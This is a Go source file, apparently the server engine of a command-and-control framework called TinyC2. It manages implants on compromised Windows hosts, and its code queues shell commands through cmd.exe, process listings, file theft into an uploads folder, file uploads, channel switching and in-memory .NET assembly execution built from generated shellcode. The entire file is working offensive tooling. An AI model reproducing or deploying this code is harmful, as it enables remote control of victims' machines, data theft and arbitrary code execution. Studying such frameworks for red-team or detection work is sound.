package core

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"

	"github.com/0xPrimo/TinyC2/server/internal/pkg/logger"

	"github.com/pterm/pterm"
)

type Implant struct {
	ID       uint32
	Seen     time.Time
	Channel  string
	Tasks    []map[string]any
	Channels map[string]uint32
}

type ImplantResponse struct {
	ID   uint32         `json:"id"`
	Task map[string]any `json:"task"`
}

func (e *Engine) ImplantProcess(listener string, data []byte) ([]byte, error) {
	var (
		response ImplantResponse
	)

	err := json.Unmarshal(data, &response)
	if err != nil {
		logger.Error("error parsing JSON: %v", err)
		return nil, err
	}

	if !e.ImplantExists(response.ID) {
		return e.ImplantRegister(response.ID, listener)
	} else {
		return e.ImplantHandleResponse(response.ID, response.Task)
	}
}

func (e *Engine) ImplantRegister(id uint32, listener string) ([]byte, error) {
	if e.ImplantExists(id) {
		return []byte{}, fmt.Errorf("implant already exists")
	}

	e.Implants[id] = Implant{
		ID:      id,
		Channel: listener,
		Channels: map[string]uint32{
			listener: 0,
		},
	}

	data, err := json.Marshal(map[string]any{"magic": "baadf00d"})
	if err != nil {
		logger.Error("error marshaling JSON: %v", err)
		return []byte{}, err
	}

	fmt.Println()
	logger.Success("implant %X registred", id)

	return data, nil
}

func (e *Engine) ImplantHandleResponse(id uint32, tasks map[string]any) ([]byte, error) {
	err := e.ImplantTaskHandler(id, tasks)
	if err != nil {
		logger.Error("failed to handle task: %v", err)
		return e.ImplantTaskQueue(id), err
	}

	return e.ImplantTaskQueue(id), nil
}

/*
 */
type ProcessInfo struct {
	Name    string `json:"name"`
	Account string `json:"account"`
	Pid     uint32 `json:"pid"`
	PPid    uint32 `json:"ppid"`
}

type FileInfo struct {
	Name string `json:"name"`
	Size uint32 `json:"size"`
	Data string `json:"data"`
}

func (e *Engine) ImplantTaskHandler(id uint32, task map[string]any) error {
	implant, _ := e.Implants[id]
	implant.Seen = time.Now()
	e.Implants[id] = implant

	if task["output"] != nil {
		logger.Success("received output:\n%s\n", task["output"])
	}

	// post command processing
	switch task["name"] {
	case "download":
		var file FileInfo

		if task["artifact"] == nil {
			return nil
		}

		err := json.Unmarshal([]byte(task["artifact"].(string)), &file)
		if err != nil {
			logger.Error("Error occurred during unmarshaling: %v", err)
			return nil
		}

		data, err := base64.StdEncoding.DecodeString(file.Data)
		if err != nil {
			logger.Error("Failed to decode base64: %v", err)
			return nil
		}

		err = os.MkdirAll("uploads", 0755)
		if err != nil {
			logger.Error("Failed to create directory: %v", err)
			return nil
		}

		var filename string
		slshindex := strings.LastIndex(file.Name, `\`)
		if slshindex == -1 {
			filename = file.Name
		} else {
			filename = file.Name[slshindex+1:]
		}

		dest := filepath.Join(
			"uploads",
			filename,
		)
		err = os.WriteFile(dest, data, 0644)
		if err != nil {
			logger.Error("Failed to write to file: %v", err)
			return nil
		}
	case "ps":
		var pslist []ProcessInfo
		err := json.Unmarshal([]byte(task["artifact"].(string)), &pslist)
		if err != nil {
			logger.Error("Error occurred during unmarshaling: %v", err)
			return nil
		}

		table := pterm.TableData{
			{"PPID", "PID", "Account", "Name"},
		}

		for _, ps := range pslist {
			table = append(table, []string{
				pterm.Cyan(fmt.Sprintf("%d", ps.PPid)),
				pterm.Cyan(fmt.Sprintf("%d", ps.Pid)),
				pterm.Cyan(ps.Account),
				pterm.Cyan(ps.Name),
			})
		}

		pterm.Println()
		pterm.DefaultTable.
			WithHasHeader().
			WithBoxed().
			WithHeaderStyle(pterm.NewStyle(pterm.FgLightMagenta, pterm.Bold)).
			WithData(table).
			Render()
		pterm.Println()

		return nil
	}

	return nil
}

func (e *Engine) ImplantTaskExecute(id uint32, task map[string]any) {
	implant, exists := e.Implants[id]
	if !exists {
		logger.Error("implant %X does not exists", pterm.Cyan(id))
		return
	}

	implant.Tasks = append(implant.Tasks, task)
	e.Implants[id] = implant
}

func (e *Engine) ImplantTaskQueue(id uint32) []byte {
	implant, exists := e.Implants[id]
	if !exists {
		logger.Error("implant %X does not exists", pterm.Cyan(id))
		return []byte{}
	}

	tasks := implant.Tasks
	implant.Tasks = []map[string]any{}
	e.Implants[id] = implant

	data, err := json.Marshal(tasks)
	if err != nil {
		logger.Error("error marshaling JSON: %v", err)
		return []byte{}
	}

	if len(tasks) > 0 {
		fmt.Println()
		logger.Info("sent %d bytes to implant %X", len(data), id)
	}

	return data
}

func (e *Engine) ImplantExists(id uint32) bool {
	_, exists := e.Implants[id]
	if !exists {
		return false
	}
	return true
}

func (e *Engine) ImplantIsAlive(id uint32) bool {
	implant, exists := e.Implants[id]
	if !exists {
		return false
	}

	return time.Since(implant.Seen) <= 5*time.Second
}

func (e *Engine) ImplantKill(id uint32) error {
	if !e.ImplantExists(id) {
		logger.Error("implant %X does not exists", id)
		return nil
	}

	// execute exit command
	e.ImplantTaskExecute(id, map[string]any{
		"name":     "exit",
		"args":     nil,
		"artifact": nil,
	})
	return nil
}

func (e *Engine) ImplantList() error {

	table := pterm.TableData{
		{"ID", "Listener", "Status"},
	}

	for id, implant := range e.Implants {
		if e.ImplantIsAlive(id) {
			table = append(table, []string{pterm.Cyan(fmt.Sprintf("%X", id)), implant.Channel, pterm.Green("alive")})
		} else {
			table = append(table, []string{pterm.Cyan(fmt.Sprintf("%X", id)), implant.Channel, pterm.Red("dead")})
		}
	}

	pterm.Println()
	pterm.DefaultTable.
		WithHasHeader().
		WithBoxed().
		WithHeaderStyle(pterm.NewStyle(pterm.FgLightMagenta, pterm.Bold)).
		WithData(table).
		Render()
	pterm.Println()

	return nil
}

func (e *Engine) ImplantChannelList(id uint32) error {
	implant, exists := e.Implants[id]
	if !exists {
		logger.Error("implant %X does not exists", id)
		return nil
	}

	table := pterm.TableData{
		{"ID", "Name"},
	}

	for name, id := range implant.Channels {
		if implant.Channel == name {
			table = append(table, []string{pterm.Green(fmt.Sprintf("* %X", id)), pterm.Green(name)})
		} else {
			table = append(table, []string{pterm.Cyan(fmt.Sprintf("%X", id)), name})
		}
	}

	pterm.Println()
	pterm.DefaultTable.
		WithHasHeader().
		WithBoxed().
		WithHeaderStyle(pterm.NewStyle(pterm.FgLightMagenta, pterm.Bold)).
		WithData(table).
		Render()
	pterm.Println()

	return nil
}

func (e *Engine) ImplantChannelRegister(id uint32, name string) error {
	implant, exists := e.Implants[id]
	if !exists {
		logger.Error("implant %X does not exists", pterm.Cyan(id))
		return nil
	}

	// generate pic
	listener, exists := e.Listeners[name]
	if !exists {
		logger.Error("listener %s does not exists", name)
		return nil
	}

	if listener.ID == 0 {
		logger.Error("%s is a default channel", name)
		return nil
	}

	pic, err := listener.Interface.MakePic(listener.ID)
	if err != nil {
		logger.Error("MakePic error: %v", err)
		return nil
	}

	implant.Channels[name] = listener.ID
	e.Implants[id] = implant

	// execute channel.register command
	e.ImplantTaskExecute(id, map[string]any{
		"name":     "channel.register",
		"args":     []uint32{listener.ID},
		"artifact": base64.StdEncoding.EncodeToString(pic),
	})

	return nil
}

func (e *Engine) ImplantChannelSwitch(id uint32, name string) error {
	implant, exists := e.Implants[id]
	if !exists {
		logger.Error("implant %X does not exists", id)
		return nil
	}

	if implant.Channel == name {
		logger.Error("channel %s is currently used", name)
		return nil
	}

	channel, exists := implant.Channels[name]
	if !exists {
		logger.Error("channel %s not registered", name)
		return nil
	}

	implant.Channel = name
	e.Implants[id] = implant

	// execute channel.swtich command
	e.ImplantTaskExecute(id, map[string]any{
		"name":     "channel.switch",
		"args":     []uint32{channel},
		"artifact": nil,
	})

	return nil
}

func (e *Engine) ImplantChannelRemove(id uint32, name string) error {
	implant, exists := e.Implants[id]
	if !exists {
		logger.Error("implant %X does not exists", id)
		return nil
	}

	channel, exists := implant.Channels[name]
	if !exists {
		logger.Error("channel %s not registered", name)
		return nil
	}

	if name == implant.Channel {
		logger.Error("channel %s is currently used", name)
		return nil
	}

	if channel == 0 {
		logger.Error("%s channel is a default channel", name)
		return nil
	}

	delete(implant.Channels, name)
	e.Implants[id] = implant

	// execute channel.remove command
	e.ImplantTaskExecute(id, map[string]any{
		"name":     "channel.remove",
		"args":     []uint32{channel},
		"artifact": nil,
	})

	return nil
}

// ImplantPs
func (e *Engine) ImplantPs(id uint32) error {
	e.ImplantTaskExecute(id, map[string]any{
		"name":     "ps",
		"args":     nil,
		"artifact": nil,
	})

	return nil
}

func (e *Engine) ImplantCd(id uint32, directory string) error {
	e.ImplantTaskExecute(id, map[string]any{
		"name":     "cd",
		"args":     []string{directory},
		"artifact": nil,
	})

	return nil
}

func (e *Engine) ImplantCp(id uint32, src string, dest string) error {
	e.ImplantTaskExecute(id, map[string]any{
		"name":     "cp",
		"args":     []string{src, dest},
		"artifact": nil,
	})

	return nil
}

func (e *Engine) ImplantShell(id uint32, command string) error {
	e.ImplantTaskExecute(id, map[string]any{
		"name":     "shell",
		"args":     []string{"C:\\Windows\\System32\\cmd.exe /c " + command},
		"artifact": nil,
	})

	return nil
}

func (e *Engine) ImplantDownload(id uint32, path string) error {
	e.ImplantTaskExecute(id, map[string]any{
		"name":     "download",
		"args":     []string{path},
		"artifact": nil,
	})

	return nil
}

func (e *Engine) ImplantUpload(id uint32, src string, dest string) error {
	data, err := os.ReadFile(src)
	if err != nil {
		logger.Error("failed to read file: %v", err)
		return err
	}

	e.ImplantTaskExecute(id, map[string]any{
		"name":     "upload",
		"args":     []string{dest},
		"artifact": base64.StdEncoding.EncodeToString(data),
	})

	return nil
}

func (e *Engine) ImplantRun(id uint32, commandline string) error {
	e.ImplantTaskExecute(id, map[string]any{
		"name":     "run",
		"args":     []string{commandline},
		"artifact": nil,
	})

	return nil
}

func (e *Engine) ImplantExecuteAssembly(id uint32, dotnet string, cmdargs string) error {
	args := []string{
		"-Dcrystalpalace.verbose=false",
		"-jar",
		e.Config.CrystalPalace.Lib,
		"buildPic",
		filepath.Join(e.Config.CrystalPalace.Pavilion, "execute-assembly-pico/runner.spec"),
		"x64",
		"/tmp/runner.bin",
		`%ASSEMBLY_PATH=` + dotnet,
		`%CMDLINE=` + cmdargs,
	}

	cmd := exec.Command("java", args...)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	if err := cmd.Run(); err != nil {
		logger.Error("configuration failed: %v", err)
		return nil
	}

	// read shellcode
	pic, err := os.ReadFile("/tmp/runner.bin")
	if err != nil {
		logger.Error("failed to read implant exe: %v", err)
		return nil
	}

	e.ImplantTaskExecute(id, map[string]any{
		"name":     "execute-assembly",
		"args":     nil,
		"artifact": base64.StdEncoding.EncodeToString(pic),
	})

	return nil
}
